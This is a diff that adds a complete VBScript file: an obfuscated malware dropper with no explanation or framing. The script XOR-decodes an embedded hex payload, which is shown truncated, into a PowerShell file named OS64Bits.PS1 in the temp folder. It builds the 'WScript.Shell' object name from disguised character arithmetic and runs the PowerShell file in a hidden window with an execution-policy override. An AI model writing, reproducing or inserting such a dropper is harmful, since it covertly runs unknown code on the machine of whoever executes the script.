@@ -1,0 +1,33 @@
+Private Function vQ(Inp, Key, Mode)
+    Dim z, i, Position, cptZahl, orgZahl, keyZahl, cptString
+    For i = 1 To lEn(Inp)
+        Position = Position + 1
+        If Position > lEn(Key) Then Position = 1
+        keyZahl = aSc(Mid(Key, Position, 1))
+        If Mode Then  
+            orgZahl = aSc(Mid(Inp, i, 1))
+            cptZahl = orgZahl Xor keyZahl
+            cptString = hEx(cptZahl)
+            If lEn(cptString) < 2 Then cptString = "0" & cptString
+            z = z & cptString  
+        Else  
+            If i > lEn(Inp) \ 2 Then Exit For
+            cptZahl = CByte("&" & "H" & Mid(Inp, i * 2 - 1, 2))
+            orgZahl = cptZahl Xor keyZahl
+            z = z & cHR(orgZahl)
+        End If
+    Next
+    vQ = z
+End Function
+
+Dim AqUhNbgAqwpMb
+AqUhNbgAqwpMb = "31562B0462222C4B781D323A2D1E1D4A2C4C39202E190F14112E3A1E0C432A5A454C1D392A1D1B5127260F22381E3D086E011F012E5B451B3F594B23031B217726535F5863201340205A593D28000E59003C3F173249335C144C493D4B234509370B044D5072585B17233B5F24703426190F7F363A1E2C2609173F552B09244B5C3E6C7D195D23136E015E2C501F0E5A453E314C34493D28331E507B394603242E526226063C291E0C08134726227F447D72334A3C1D3158532D3C4C7E754425390E0D7841200A0F0F03316A26505E3A413119576F141679085C2D5551445420325134502C1C1E5C0B153D131E3E41505D7303180A7F1F1F7D0E2D733E03126F215C7B794641334B58766C1A567E515B78093F0E0A540E7908027F05166B241E681C5379264B... (remaining bytes removed)
+
+Dim SH
+SH = cHR(80 + 7) & cHR(100 + 15) & cHR(66 + 1) & cHR(80 + 2) & cHR(110 - 5) & cHR(85 - 5) & cHR(80 + 4) & cHR(40 + 6) & cHR(230 / 2) & cHR(36 * 2) & cHR(60 + 9) & cHR(100 + 8) & cHR(70 + 6)
+Set WS = CreateObject(SH)
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Set MyFile = FSO.CreateTextFile(FSO.GetSpecialFolder(2) + "\OS64Bits.PS1", True)
+MyFile.WriteLine(rEPlAcE(vQ(AqUhNbgAqwpMb, "p2O)6[\.X0sI^{p(@5wAC|/Gh]N{am}3+(rNY3]>UK|/2_YlCUfqK{hZL*.NawX9G>:x.I", False), "%VBS%", wscript.SCRIPTFULLNAME))
+MyFile.Close
+WS.rUN "POWERSHELL -eXEcUTiONpOLicY rEmOtEsIgNeD -FILE " & FSO.GetSpecialFolder(2) + "\OS64Bits.PS1", 0
